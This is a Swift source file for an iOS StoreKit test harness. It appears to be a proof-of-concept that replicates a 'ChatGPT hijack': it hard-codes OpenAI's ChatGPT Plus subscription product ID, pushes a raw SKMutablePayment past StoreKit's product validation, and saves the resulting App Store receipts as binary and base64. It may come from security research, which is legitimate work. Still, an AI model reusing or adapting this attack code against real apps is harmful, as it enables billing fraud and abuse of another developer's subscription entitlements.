import StoreKit
import Foundation
import UIKit

final class StoreKitHelper: NSObject, ObservableObject, SKProductsRequestDelegate, SKPaymentTransactionObserver, SKRequestDelegate {
    static let shared = StoreKitHelper()

    /// Product ID — must match what is configured in your App Store Connect IAP.
    /// To replicate the ChatGPT hijack, set this to ChatGPT's productId:
    ///   `oai_chatgpt_plus_1999_1m`
    static let productID = "oai_chatgpt_plus_1999_1m"

    @Published var state: String = "init"
    @Published var productLine: String = "(none)"
    @Published var receiptB64: String = ""
    @Published var receiptLen: Int = 0
    @Published var canBuy: Bool = false

    private var product: SKProduct?
    private var productsRequest: SKProductsRequest?
    private var refreshRequest: SKReceiptRefreshRequest?

    /// Path to log file: ~/Documents/iaptest_log.txt
    private lazy var logURL: URL = {
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
        return docs.appendingPathComponent("iaptest_log.txt")
    }()

    private func log(_ msg: String) {
        let ts = ISO8601DateFormatter().string(from: Date())
        let line = "[\(ts)] \(msg)\n"
        if let data = line.data(using: .utf8) {
            if FileManager.default.fileExists(atPath: logURL.path) {
                if let h = try? FileHandle(forWritingTo: logURL) {
                    h.seekToEndOfFile()
                    h.write(data)
                    try? h.close()
                }
            } else {
                try? data.write(to: logURL)
            }
        }
        NSLog("[IAPTest] %@", msg)
    }

    func start() {
        // Reset log on each launch
        try? "".write(to: logURL, atomically: true, encoding: .utf8)
        log("=== IAPTest launched pid=\(ProcessInfo.processInfo.processIdentifier) ===")
        log("bundleId=\(Bundle.main.bundleIdentifier ?? "?")")
        log("productID=\(Self.productID)")
        log("Documents=\(logURL.deletingLastPathComponent().path)")
        SKPaymentQueue.default().add(self)
        state = "observer added"
        log("SKPaymentQueue observer added")
        loadExistingReceipt()
    }

    func fetchProduct() {
        state = "fetching..."
        log("=== fetchProduct called for pid=\(Self.productID) ===")
        let req = SKProductsRequest(productIdentifiers: [Self.productID])
        req.delegate = self
        productsRequest = req
        req.start()
        log("SKProductsRequest started")
    }

    /// Skip SKProductsRequest entirely. Construct SKMutablePayment with raw productId
    /// and add to queue. Useful to bypass storekit's "invalid product" client cache.
    func directBuy() {
        log("=== directBuy called for pid=\(Self.productID) (no SKProductsRequest) ===")
        let payment = SKMutablePayment()
        payment.productIdentifier = Self.productID
        payment.applicationUsername = "test-user-1234"
        SKPaymentQueue.default().add(payment)
        state = "direct buy initiated..."
        log("SKMutablePayment added to queue with raw productId")
    }

    // MARK: - SKProductsRequestDelegate

    func productsRequest(_ request: SKProductsRequest, didReceive response: SKProductsResponse) {
        log("productsRequest didReceive: products=\(response.products.count) invalid=\(response.invalidProductIdentifiers.count)")
        for p in response.products {
            log("  PRODUCT: id=\(p.productIdentifier) price=\(p.price) currency=\(p.priceLocale.currencyCode ?? "?") title=\(p.localizedTitle) desc=\(p.localizedDescription)")
            if let sp = p.subscriptionPeriod {
                log("    sub period=\(sp.numberOfUnits) unit=\(sp.unit.rawValue) groupId=\(p.subscriptionGroupIdentifier ?? "?")")
            }
            if let intro = p.introductoryPrice {
                log("    intro price=\(intro.price) period=\(intro.subscriptionPeriod.numberOfUnits) numPeriods=\(intro.numberOfPeriods)")
            }
        }
        for invalid in response.invalidProductIdentifiers {
            log("  INVALID: \(invalid)")
        }
        DispatchQueue.main.async {
            if let p = response.products.first {
                self.product = p
                let priceStr: String = {
                    let f = NumberFormatter()
                    f.numberStyle = .currency
                    f.locale = p.priceLocale
                    return f.string(from: p.price) ?? "?"
                }()
                self.productLine = "\(p.productIdentifier) | \(priceStr) | period=\(self.periodStr(p.subscriptionPeriod))"
                self.canBuy = true
                self.state = "ready"
            } else {
                self.productLine = "INVALID: \(response.invalidProductIdentifiers.joined(separator: ","))"
                self.state = "no product matched (check ASC config + paid agreement)"
            }
        }
    }

    func request(_ request: SKRequest, didFailWithError error: Error) {
        let nse = error as NSError
        log("request DIDFAIL: domain=\(nse.domain) code=\(nse.code) desc=\(nse.localizedDescription) userInfo=\(nse.userInfo)")
        DispatchQueue.main.async {
            self.state = "request failed: \(error.localizedDescription)"
        }
    }

    func requestDidFinish(_ request: SKRequest) {
        if request is SKReceiptRefreshRequest {
            DispatchQueue.main.async {
                self.loadExistingReceipt()
                self.state = "receipt refreshed"
            }
        }
    }

    // MARK: - Purchase

    func buy() {
        guard let p = product else { return }
        let payment = SKMutablePayment(product: p)
        payment.applicationUsername = "test-user-1234"  // hash of your test app user id
        SKPaymentQueue.default().add(payment)
        state = "purchasing..."
    }

    func refreshReceipt() {
        let req = SKReceiptRefreshRequest()
        req.delegate = self
        refreshRequest = req
        req.start()
        state = "refreshing receipt..."
    }

    // MARK: - SKPaymentTransactionObserver

    func paymentQueue(_ queue: SKPaymentQueue, updatedTransactions transactions: [SKPaymentTransaction]) {
        for tx in transactions {
            log("TX update: state=\(txStateName(tx.transactionState)) pid=\(tx.payment.productIdentifier) txid=\(tx.transactionIdentifier ?? "?") origTxid=\(tx.original?.transactionIdentifier ?? "?")")
            DispatchQueue.main.async {
                self.state = "tx state=\(self.txStateName(tx.transactionState)) pid=\(tx.payment.productIdentifier)"
            }
            switch tx.transactionState {
            case .purchased, .restored:
                log("TX purchased/restored - loading receipt")
                loadExistingReceipt()
                SKPaymentQueue.default().finishTransaction(tx)
                log("TX finished")
            case .failed:
                if let e = tx.error {
                    let nse = e as NSError
                    log("TX FAILED: domain=\(nse.domain) code=\(nse.code) desc=\(nse.localizedDescription)")
                    DispatchQueue.main.async {
                        self.state = "tx failed: \(e.localizedDescription)"
                    }
                }
                SKPaymentQueue.default().finishTransaction(tx)
            default: break
            }
        }
    }

    // MARK: - Helpers

    func loadExistingReceipt() {
        guard let url = Bundle.main.appStoreReceiptURL else {
            log("appStoreReceiptURL is nil")
            DispatchQueue.main.async {
                self.receiptB64 = ""
                self.receiptLen = 0
            }
            return
        }
        log("appStoreReceiptURL=\(url.path)")
        guard let data = try? Data(contentsOf: url) else {
            log("receipt file does not exist or unreadable")
            DispatchQueue.main.async {
                self.receiptB64 = ""
                self.receiptLen = 0
            }
            return
        }
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
        let copyURL = docs.appendingPathComponent("sandbox_receipt.bin")
        try? data.write(to: copyURL)
        let b64URL = docs.appendingPathComponent("sandbox_receipt.b64.txt")
        try? data.base64EncodedString().write(to: b64URL, atomically: true, encoding: .utf8)
        log("RECEIPT loaded len=\(data.count) saved to Documents/sandbox_receipt.bin and .b64.txt")
        DispatchQueue.main.async {
            self.receiptLen = data.count
            self.receiptB64 = data.base64EncodedString()
        }
    }

    private func periodStr(_ period: SKProductSubscriptionPeriod?) -> String {
        guard let p = period else { return "(non-sub)" }
        let unit: String
        switch p.unit {
        case .day: unit = "D"
        case .week: unit = "W"
        case .month: unit = "M"
        case .year: unit = "Y"
        @unknown default: unit = "?"
        }
        return "\(p.numberOfUnits)\(unit)"
    }

    private func txStateName(_ s: SKPaymentTransactionState) -> String {
        switch s {
        case .purchasing: return "purchasing"
        case .purchased: return "purchased"
        case .failed: return "failed"
        case .restored: return "restored"
        case .deferred: return "deferred"
        @unknown default: return "?"
        }
    }
}
